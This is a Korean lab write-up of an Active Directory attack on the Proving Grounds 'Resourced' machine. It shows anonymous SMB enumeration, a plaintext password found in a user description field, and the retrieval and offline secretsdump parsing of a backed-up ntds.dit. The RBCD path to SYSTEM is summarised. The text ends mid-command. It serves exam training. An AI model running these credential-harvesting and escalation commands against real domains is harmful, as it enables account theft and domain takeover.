---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/rbcd
  - tech/ad/delegation
  - tech/ad/pth
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
type: machine
platform: pg
os: windows
ip: 192.168.125.175
domain: resourced.local
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---
> [!info] PG Practice — Resourced · **Active Directory 단일 DC**
> **타겟** 192.168.125.175 → (리버트 후) 192.168.120.175 · **OS** Windows Server 2019 Standard Evaluation (build 17763, `RESOURCEDC.resourced.local`) · **난이도** Intermediate · **플래그 2개**
> **경로 요약** **익명 SMB 열거**로 사용자 목록 → `V.Ventz` **description 필드에 평문 비밀번호** → `Password Audit` 공유에 남은 **ntds.dit + SYSTEM/SECURITY 하이브** → **오프라인 secretsdump**로 전 도메인 NT 해시 → 만료되지 않은 `L.Livingstone` 해시로 **PtH → WinRM** (local.txt) → BloodHound가 `L.Livingstone --GenericAll--> RESOURCEDC$` 확인 → **머신계정 생성 + RBCD 설정 + S4U** → `cifs/resourcedc` 서비스 티켓으로 **psexec → SYSTEM** (proof.txt)

> [!warning] 이 노트를 읽는 규약 — 관측된 것과 재구성을 구분한다
> 이 노트의 터미널 블록은 **원본 노트에 기록돼 있던 실측 출력**과 **Kali에 남은 산출물로 재확인한 것**뿐이다. 새로 지어낸 출력은 없다.
> - **Kali 산출물로 실증됨**: `~/PG/Resourced/nmap.log` · `users.txt` · `hashs.txt` · `sweep.txt` · `Active Directory/{ntds.dit,ntds.jfm}` · `registry/{SYSTEM,SECURITY,ntds.dit}` · `Administrator@cifs_resourcedc...ccache` · BloodHound JSON 7종(`20260703143203_*`) · `~/.zsh_history` 1336–1501행
> - **원본 노트에만 있는 출력**(대조 원본 없음): `nxc smb --users` 전문 · `smbclient mget` 전송 로그 · `impacket-secretsdump` 전문 · evil-winrm/psexec 세션. 명령어·해시·플래그 값 자체는 위 산출물과 일치함을 확인했다.
> - **이 노트가 새로 판정한 것**은 전부 근거를 함께 적었다. 근거가 없는 추정은 `[가정]`으로 표시했다.

---

## 0. 이 박스에서 배우는 것

- **AD의 "설명 필드"는 자격증명 저장소다** — `description` 속성은 **인증된 사용자 전원이 읽는다.** 이 박스는 거기에 평문 비밀번호를 넣어뒀고, 심지어 **익명으로도** 읽혔다
- **익명 SMB/LDAP 열거가 되는 이유** — `Pre-Windows 2000 Compatible Access` 그룹에 **`ANONYMOUS LOGON`(S-1-5-7)** 이 들어 있으면 널 세션이 도메인 개체를 읽는다. 이 노트는 BloodHound 덤프로 **그 사실을 직접 확인**한다
- **`ntds.dit`를 오프라인으로 까는 법** — DCSync가 아니다. `SYSTEM` 하이브의 bootKey → `ntds.dit` 안의 **PEK** → 사용자별 `unicodePwd` 복호화. **DC에 로그인하지 않고** 도메인 전체 해시를 얻는다
- **`STATUS_PASSWORD_EXPIRED`는 "해시가 맞다"는 뜻이다** — 실패가 아니라 **정답 신호**다. 이걸 실패로 읽으면 박스가 끝난다
- **RBCD(Resource-Based Constrained Delegation) 전 과정** — `MachineAccountQuota`로 머신계정 생성 → 대상의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 쓰기 → **S4U2Self + S4U2Proxy**로 Administrator 사칭 티켓 발급
- **Kerberos 상시 함정 셋** — **시계 오차**(`KRB_AP_ERR_SKEW`) · **이름 해석**(SPN은 IP가 아니라 FQDN) · **`KRB5CCNAME` 경로**

> [!tip] 시험 출제 가능성 — **매우 높다**
> | 요소 | 출제 가능성 | 이유 |
> |---|---|---|
> | **description 필드 비밀번호** | **매우 높음** | OSCP AD 세트의 최다 빈출 초기 침투. [[Hutch]]가 정확히 같은 함정이고, 거기서는 **LDAP description**이었다 |
> | **공유에 방치된 백업에서 자격증명** | **높음** | `Password Audit`·`Backups`·`IT` 같은 이름의 공유는 **무조건 전부 받아라**. `ntds.dit`·`SAM`·`unattend.xml`·`.kdbx`·`web.config`가 나온다 |
> | **PtH → WinRM** | **매우 높음** | 해시를 얻은 다음의 **기본 반사**다 |
> | **RBCD** | **중간~높음** | 시험 AD 세트는 보통 더 단순한 ACL(GenericAll on user → 비밀번호 리셋)을 쓰지만, **GenericAll이 «컴퓨터» 객체에 붙으면** RBCD가 정석이다 |
>
> **변형은 이런 모습이다** — description 대신 `SYSVOL`의 GPP `cpassword`, `Password Audit` 공유 대신 `\\DC\Backups\SAM+SYSTEM`, RBCD 대신 **Shadow Credentials**(`AddKeyCredentialLink`).

> [!abstract] 이 박스가 [[Hutch]]와 짝을 이루는 이유
> 두 박스 모두 **단일 Windows Server 2019 DC**이고, 초기 침투가 **"관리자가 비밀번호를 텍스트 필드에 적어뒀다"** 이며, 최종 상승이 **"저권한 사용자가 DC 컴퓨터 객체에 대해 갖지 말아야 할 ACE를 갖고 있다"** 이다.
> 차이는 그 ACE가 무엇이냐다 — Resourced는 **`GenericAll`**(→ RBCD), Hutch는 **`ReadLAPSPassword`**(→ 로컬 관리자 평문). 두 노트를 **연달아** 읽으면 "DC 컴퓨터 객체에 붙은 ACE를 어떻게 무기화하는가"가 한 세트로 정리된다.

---

## 1. 정찰

### 1-1. Nmap — DC 지문은 포트 조합으로 읽는다

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nnmap 192.168.125.175
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 09:13 +0900
Nmap scan report for 192.168.125.175
Host is up (0.068s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-03 00:14:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-03T00:15:02+00:00
|_ssl-date: 2026-07-03T00:15:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-07-02T00:11:20
|_Not valid after:  2027-01-01T00:11:20
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-03T00:15:04
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   65.68 ms 192.168.45.1
2   65.64 ms 192.168.45.254
3   66.42 ms 192.168.251.1
4   66.77 ms 192.168.125.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.58 seconds
```

> [!note] `nnmap` 은 오타가 아니다 — `~/.zshrc:247` 의 별칭이다
> ```
> alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
> ```
> 이 노트 전체에서 `nnmap <IP>` 는 위 명령과 **완전히 동일**하다. `nmap.log` 헤더가 그것을 스스로 증명한다 — `as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`.

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 고번호 RPC 동적 포트(49666~49708)를 놓친다. DC에서는 치명적이지 않지만, **RPC 엔드포인트 매퍼가 넘겨주는 포트가 필터링되면 psexec/wmiexec이 조용히 실패**한다. 미리 보이는 편이 낫다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `rdp-ntlm-info` NSE가 안 돌아 **`DNS_Computer_Name: ResourceDC.resourced.local`** 을 못 얻는다. 이 한 줄이 뒤에서 `/etc/hosts`와 SPN을 만든다 |
| `-Pn` | ping 생략 | Windows 방화벽은 ICMP를 기본 차단한다. **빼면 "host down"으로 오판하고 스캔 자체를 안 한다** |
| `-A` | OS 추측 + traceroute | `Windows Server 2019 (92%)`. 뒤에서 nxc 배너의 `Build 17763`과 **교차 검증**한다 |
| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 × 필터링 = 수십 분 → **131초**. 24시간 시험에서 이 한 줄이 시간을 만든다 |

> [!tip] DC 포트 지문 — 이 조합을 보면 즉시 AD 모드로 전환한다
> **`88`(Kerberos) + `389/636/3268/3269`(LDAP/GC) + `445` + `53`(DNS)** 넷이 함께 열려 있으면 **거의 확실히 도메인 컨트롤러**다.
> - `88` 하나만으로도 KDC 확정 — 워크스테이션은 88을 열지 않는다
> - `3268/3269`는 **글로벌 카탈로그**. 포리스트 루트 DC라는 뜻이다
> - `9389`는 AD Web Services(ADWS) — PowerShell `Get-ADUser` 계열이 쓰는 채널
> - `5985`(WinRM)가 열려 있으면 **해시만 얻으면 곧바로 셸**이다. 이 박스의 결말이 정확히 그것이다
>
> **여기서 도메인 이름을 확보하는 것이 첫 작업이다.** 이 스캔은 세 곳에서 알려준다 — LDAP 서비스 설명(`Domain: resourced.local`), `rdp-ntlm-info`, `ssl-cert` CN. **출처 세 개가 일치**하므로 도메인은 확정이다.

> [!warning] `Message signing enabled and required` — NTLM 릴레이가 죽었다는 뜻이다
> `smb2-security-mode`가 **required**면 SMB 서명이 강제다. **DC는 기본값이 강제**이므로 이건 오설정이 아니라 정상이다.
> 실질적 의미: **[[Heist]]·[[Vault]]에서 통한 `ntlmrelayx` → SMB 경로가 이 박스에서는 성립하지 않는다.** 릴레이를 시도하기 전에 이 줄부터 봐라 — 시도 자체를 아낀다.
> (릴레이가 완전히 죽는 것은 아니다. **LDAP/LDAPS·ADCS(ESC8) 쪽으로는** 여전히 갈 수 있다. 다만 이 박스는 그 경로가 필요 없었다.)

### 1-2. 익명 SMB 열거 — 사용자 목록과 «description 필드»

`smbclient -L <IP> -N` 으로 널 세션을 먼저 두드린 뒤(zsh_history 1340행), nxc로 사용자 열거를 걸었다.

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 --users
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.125.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account
SMB         192.168.125.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin
SMB         192.168.125.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer
SMB         192.168.125.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin
SMB         192.168.125.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist
SMB         192.168.125.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist
SMB         192.168.125.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer
SMB         192.168.125.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin
SMB         192.168.125.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god
SMB         192.168.125.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced
```
![[Pasted image 20260703101938.png]]

`V.Ventz` 줄에 **평문 비밀번호가 그대로 있다**: `New-hired, reminder: HotelCalifornia194!`

> [!danger] **`-Description-` 열은 열거 결과의 장식이 아니라 «본문»이다**
> `nxc --users` 출력에서 사람들이 사용자명만 긁고 설명 열을 흘려보낸다. **거기가 자격증명이 있는 곳이다.**
> 이 박스와 [[Hutch]] 둘 다 초기 침투가 정확히 이 필드였다. 반사적으로 이렇게 걸러라:
> ```bash
> nxc smb <IP> --users | grep -iE "pass|pwd|reminder|temp|welcome|change|set to|:.*[!@#$%]"
> ```
> nxc에는 이 목적의 전용 모듈도 있다(실측 — `nxc ldap -L` 목록에 등재돼 있다):
> ```
> [*] get-desc-users   Get description of the users. May contained password
> [*] user-desc        Get user descriptions stored in Active Directory
> ```

> [!note] **왜 «자격증명 없이» 이게 읽혔는가** — BloodHound 덤프가 답을 준다
> 도메인 사용자 열거는 원래 인증을 요구한다. 이 박스에서 널 세션으로 뚫린 이유는 BloodHound 그룹 덤프에 **직접 찍혀 있다**:
> ```bash
> $ jq '.data[] | select(.Properties.name|test("PRE-WINDOWS";"i")) | {name:.Properties.name, members:[.Members[]?|.ObjectIdentifier]}' \
>     20260703143203_groups.json
> {
>   "name": "PRE-WINDOWS 2000 COMPATIBLE ACCESS@RESOURCED.LOCAL",
>   "members": [
>     "RESOURCED.LOCAL-S-1-5-7 Group",
>     "RESOURCED.LOCAL-S-1-5-11 Group"
>   ]
> }
> ```
> **`S-1-5-7` = `ANONYMOUS LOGON`** 이다(`S-1-5-11`은 `Authenticated Users`). 이 그룹은 도메인 개체에 대한 **읽기 권한을 상속**받으므로, 여기에 `ANONYMOUS LOGON`이 들어가면 **널 세션이 사용자·그룹·설명을 전부 읽는다.**
> 대조군으로 [[Hutch]]의 같은 그룹에는 **`S-1-5-11`만** 들어 있다 — 그래서 Hutch에서는 SMB 널 세션 사용자 열거가 이 경로로는 되지 않았고, **다른 경로(익명 LDAP)** 를 써야 했다.
> **일반화**: DC를 만나면 `nxc smb <IP> --users` 를 **자격증명 없이 한 번은 반드시 던져라.** 되는 도메인이 실제로 있다. 10초짜리 시도다.

사용자 목록은 그대로 파일로 남겼다(`~/PG/Resourced/users.txt`, 14행 — `RESOURCEDC` 머신계정 포함):

```
Administrator
Guest
RESOURCEDC
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

> [!warning] nxc는 `Enumerated 13 local users` 라고 하는데 목록은 14행이다 — 모순이 아니다
> nxc가 센 13개는 **SAMR가 돌려준 사용자 계정**이고, `users.txt`에는 뒤에서 `secretsdump` 결과로 얻은 **머신계정 `RESOURCEDC$`** 가 추가로 들어 있다. 실제로 BloodHound `users.json`도 사용자를 13개(+`NT AUTHORITY` 가상 개체)로 센다.
> **표와 서술이 어긋나 보이면 세는 대상이 다른지 먼저 의심하라.**

### 1-3. 자격증명 하나로 붙는 서비스 전수 확인

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc-sweep 192.168.125.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
[*] Starting NXC sweep for 192.168.125.175 as V.Ventz ...

[+] Port 445 open. Checking smb ...
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.125.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.125.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.125.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.125.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.125.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.125.175 445    RESOURCEDC       NETLOGON        READ            Logon server share
SMB         192.168.125.175 445    RESOURCEDC       Password Audit  READ
SMB         192.168.125.175 445    RESOURCEDC       SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.125.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.125.175 5985   RESOURCEDC       [-] resourced.local\V.Ventz:HotelCalifornia194!

[+] Port 3389 open. Checking rdp ...
RDP         192.168.125.175 3389   RESOURCEDC       [*] Windows 10 or Windows Server 2016 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (nla:False)
RDP         192.168.125.175 3389   RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```
![[Pasted image 20260703104211.png]]

> [!note] `nxc-sweep` 은 표준 도구가 아니라 이 Kali의 로컬 래퍼다
> 시험장/다른 머신에는 없다. **수동 대안**은 프로토콜별 nxc 호출이다:
> ```bash
> nxc smb   <IP> -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
> nxc winrm <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
> nxc rdp   <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
> nxc ldap  <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
> ```
> 이 래퍼의 **한계**가 뒤에서 시간을 태운다 — §6-1 참조.

읽어야 할 것 셋:

1. **`Password Audit` — 기본 공유가 아니다.** `ADMIN$`·`C$`·`IPC$`·`NETLOGON`·`SYSVOL`은 DC의 기본 공유다. **비표준 공유는 그 자체로 신호**이고, 이름이 하필 "Password Audit"이다.
2. **WinRM은 `[-]`, RDP는 `[+]`.** 같은 자격증명인데 결과가 다르다 — 인증이 아니라 **권한**의 문제다. WinRM은 `Remote Management Users`(또는 관리자) 멤버십을 요구한다. BloodHound 덤프로 확인하면 `V.Ventz`는 그 그룹에 없고 `L.Livingstone`이 있다(§4-2).
3. **`nla:False`.** RDP에 NLA가 꺼져 있다 — 사전 인증 없이 로그인 화면까지 도달한다. 이 박스에서는 쓰지 않았지만, **GUI가 필요한 상황(예: 브라우저 저장 자격증명, DPAPI)의 예비 경로**로 기억해 둘 것.

### 1-4. `Password Audit` 공유 전체 회수

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ smbclient '//192.168.125.175/Password Audit' -U V.Ventz
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 17:49:16 2021
  ..                                  D        0  Tue Oct  5 17:49:16 2021
  Active Directory                    D        0  Tue Oct  5 17:49:16 2021
  registry                            D        0  Tue Oct  5 17:49:16 2021

                7706623 blocks of size 4096. 2687456 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (2463.5 KiloBytes/sec) (average 2463.5 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (59.9 KiloBytes/sec) (average 2400.9 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (237.0 KiloBytes/sec) (average 2345.3 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (1750.2 KiloBytes/sec) (average 2065.0 KiloBytes/sec)
```
![[Pasted image 20260703133853.png]]

Kali에 지금도 남아 있는 파일이 이 전송을 증명한다:

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ ls -la "Active Directory" registry
Active Directory:
-rw-r--r-- 1 kali kali 25165824 Jul  3 13:21 ntds.dit
-rw-r--r-- 1 kali kali    16384 Jul  3 13:21 ntds.jfm

registry:
-rw-r--r-- 1 kali kali 25165824 Jul  3 13:46 ntds.dit     # ← 13:46, secretsdump 편의를 위해 복사한 것
-rw-r--r-- 1 kali kali    65536 Jul  3 13:21 SECURITY
-rw-r--r-- 1 kali kali 16777216 Jul  3 13:21 SYSTEM
```

![[Pasted image 20260703134408.png]]

> [!tip] `smbclient` 로 공유를 통째로 받는 3줄 — 외워라
> ```
> smb: \> recurse on     # 하위 디렉터리까지
> smb: \> prompt off     # 파일마다 y/n 묻지 않기
> smb: \> mget *         # 전부
> ```
> `prompt off`를 빼면 **파일마다 확인을 묻고**, 비대화식 파이프에서는 그대로 멈춘다. `recurse on`을 빼면 `mget *`이 **디렉터리를 건너뛰고 최상위 파일만** 가져온다 — 이 공유는 최상위에 파일이 하나도 없으므로 **아무것도 못 받고 끝난다.**
> 한 줄짜리 비대화식 대안:
> ```bash
> smbclient '//<IP>/Password Audit' -U 'V.Ventz%HotelCalifornia194!' -c 'recurse on; prompt off; mget *'
> ```

---

## 2. 취약점 분석 — 이 박스의 핵심

### 2-1. 무엇이 공유에 있었나 — «누가 어떻게 뽑았는가»를 파일 배치로 역산한다

받은 것은 파일 넷이다. 이 **배치**가 출처를 특정한다.

| 경로 | 크기 | 정체 |
|---|---:|---|
| `Active Directory\ntds.dit` | 25,165,824 | AD 데이터베이스 본체 (ESE/JET DB) |
| `Active Directory\ntds.jfm` | 16,384 | ESE **점검 파일**(checkpoint/flush map) |
| `registry\SYSTEM` | 16,777,216 | `HKLM\SYSTEM` 하이브 — **bootKey**가 여기 있다 |
| `registry\SECURITY` | 65,536 | `HKLM\SECURITY` 하이브 — **LSA 시크릿**이 여기 있다 |

> [!danger] 이 디렉터리 구조는 **`ntdsutil` 의 IFM(Install From Media) 백업 산출물과 정확히 일치한다**
> `ntdsutil "activate instance ntds" "ifm" "create full C:\경로"` 는 대상 디렉터리 아래에
> **`Active Directory\`(→ `ntds.dit`, `ntds.jfm`)** 와 **`registry\`(→ `SECURITY`, `SYSTEM`)** 두 개를 만든다.
> 우리가 받은 것이 **그 두 디렉터리, 그 네 파일, 그 이름 그대로**다. 대안 후보들은 이 배치를 만들지 못한다:
> - `secretsdump -just-dc`(DRSUAPI) → **파일을 만들지 않는다.** 해시를 stdout으로 뱉는다
> - `reg save HKLM\SYSTEM` 수동 백업 → 하이브만 나오고 `Active Directory\` 디렉터리가 없다
> - `esentutl /y` 복사 → `ntds.dit` 한 개만, 디렉터리 구조 없음
>
> **판정: 관리자가 `ntdsutil` IFM으로 DC 백업을 떠서 그 결과를 공유 폴더에 그대로 두었다.**
> **[가정]** — DC 측에서 실행 흔적을 볼 수 없으므로 «IFM 산출물과 배치가 일치한다»는 정황 증거에 근거한 판정이다. 사람이 같은 구조를 손으로 만들었을 가능성을 완전히 배제하지는 못한다. 다만 **어느 쪽이든 이 노트의 다음 단계(오프라인 파싱)는 달라지지 않는다.**
> IFM은 내부적으로 **볼륨 섀도 복사(VSS)** 를 써서 잠긴 `ntds.dit`를 일관성 있게 뜬다 — 그래서 "VSS를 썼느냐"는 질문의 답은 **"관리자가 썼다. 우리는 그 결과물을 주웠을 뿐이다."**
> **[가정]**: 어떤 계정이 언제 실행했는지는 DC 측 로그를 못 봤으므로 확인 불가다. 다만 `Password Audit` 이라는 공유 이름과 **2021-10-05 17:49** 라는 디렉터리 타임스탬프가 "비밀번호 감사용으로 뜬 백업"이라는 시나리오와 일치한다.

> [!warning] 우리가 **하지 않은** 것을 명확히 해 둔다 — 태그가 여기서 갈린다
> | 기법 | 이 박스에서 썼나 | 근거 |
> |---|---|---|
> | **DCSync (DRSUAPI)** | **아니오** | `secretsdump`를 `local` 모드로, **오프라인 파일에** 돌렸다. 네트워크 RPC 호출이 없다. 출력에 `Using the DRSUAPI method` 줄이 **없다** — [[Hutch]]에는 그 줄이 있다 |
> | **Backup Operators 권한 남용** | **아니오** | `V.Ventz`는 어떤 특권 그룹에도 없다. 공유 READ 권한만으로 끝났다 |
> | **`SeBackupPrivilege`로 하이브 복사** | **아니오** | 셸조차 없는 시점이었다. ([[Vault]]가 그 경로다) |
> | **VSS(섀도 복사)** | **간접적으로만** | 관리자의 IFM 백업이 내부적으로 썼다. **우리가 호출하지 않았다** |
>
> 그래서 이 노트의 프론트매터에서 **`tech/ad/dcsync` 태그를 제거**했다. 개작 전 노트에는 붙어 있었지만 **오프라인 파싱은 DCSync가 아니다.**

### 2-2. `ntds.dit` 안에서 해시가 어떻게 보호되는가 — 복호화 사슬

`ntds.dit`를 그냥 열어도 해시는 안 보인다. **삼중 포장**돼 있다.

```
SYSTEM 하이브
  └─ HKLM\SYSTEM\CurrentControlSet\Control\Lsa 의 하위 키 4개
       {JD}, {Skew1}, {GBG}, {Data} 의 «클래스 이름» 문자열
          └─ 이어붙여 바이트로 → 고정 순열로 뒤섞음 ⇒ ★ bootKey (SysKey), 16바이트
                                                     │
ntds.dit (ESE DB)                                     │
  └─ datatable → 개체 «Domain» 의 pekList 속성        │
       └─ bootKey 로 복호화 ⇒ ★ PEK (Password Encryption Key)
                                     │
  └─ datatable → 사용자 행의 unicodePwd / dBCSPwd / supplementalCredentials
       └─ PEK + 해당 행의 RID 로 복호화 ⇒ ★ NT 해시 / Kerberos 키
```

이 사슬 때문에 **`ntds.dit` 만으로는 아무것도 못 얻는다.** `SYSTEM` 하이브가 반드시 함께 있어야 한다.
그리고 실제 실행 로그가 이 사슬을 **한 줄씩 그대로 보여준다** — `bootKey` → `PEK # 0 found and decrypted` → `Reading and decrypting hashes`.

`SECURITY` 하이브는 **NT 해시에는 필요 없다.** 그것이 주는 것은 별개의 전리품이다:
- `$MACHINE.ACC` — DC 컴퓨터 계정의 평문(hex) 및 NT 해시 → **실버 티켓 위조**에 쓸 수 있다
- `DPAPI_SYSTEM` — DPAPI 마스터키 → 저장된 자격증명·브라우저 비밀번호 복호화
- `NL$KM` — 캐시된 도메인 로그온(MSCache2) 복호화 키
- `cached domain logon information` — 이 박스에서는 **비어 있었다**(출력에 항목이 없다). DC는 보통 로그온을 캐시하지 않는다

### 2-3. `secretsdump` 의 `local` 모드 — 위치 인자를 빠뜨리면 이렇게 죽는다

zsh_history 1357~1358행에 **두 번의 시도**가 남아 있다. 첫 번째는 실패했다.

실제로 다시 때려본 결과다(Kali에서 재실행, 2026-08-20):

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit
usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
                      [-security SECURITY] [-sam SAM] [-ntds NTDS]
                      ...
                      target
secretsdump.py: error: the following arguments are required: target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```

> [!danger] `local` 은 옵션이 아니라 **위치 인자(target)** 다
> `secretsdump.py`의 문법은 `secretsdump.py [옵션들] target` 이고, `target`은 보통 `domain/user:pass@host` 형식이다.
> **오프라인 파일을 깔 때는 그 자리에 문자열 `local` 을 넣는다.** 빼면 파싱 단계에서 `the following arguments are required: target` 로 죽는다 — **하이브가 잘못됐다거나 파일이 깨졌다는 뜻이 아니다.**
> 이 에러를 파일 문제로 오독하면 `ntds.dit`를 다시 받으러 가느라 10분을 태운다.

### 2-4. 왜 «만료된 비밀번호»가 해시를 무력화하는가

전 도메인 해시를 얻은 뒤 그것을 그대로 SMB에 던지면, 대부분이 `STATUS_PASSWORD_EXPIRED` 로 돌아온다(§4-1). 이것이 이 박스의 **가장 중요한 학습 지점**이다.

- `STATUS_LOGON_FAILURE` — 자격증명이 **틀렸다**
- `STATUS_ACCOUNT_DISABLED` — 자격증명은 맞지만 **계정이 비활성**
- **`STATUS_PASSWORD_EXPIRED` — 자격증명이 «맞다».** NTLM 검증은 통과했고, 서버가 "비밀번호를 바꾸기 전에는 세션을 못 준다"고 거절한 것이다

즉 **`PASSWORD_EXPIRED`는 해시가 정확하다는 증거**다. 해시가 틀렸으면 `LOGON_FAILURE`가 왔을 것이다.

그렇다면 **왜 `L.Livingstone`과 `V.Ventz`만 통과했는가?** BloodHound 사용자 덤프가 그대로 답한다:

```bash
$ jq -r '.data[] | "\(.Properties.name) | pwdneverexpires=\(.Properties.pwdneverexpires)"' \
    20260703143203_users.json
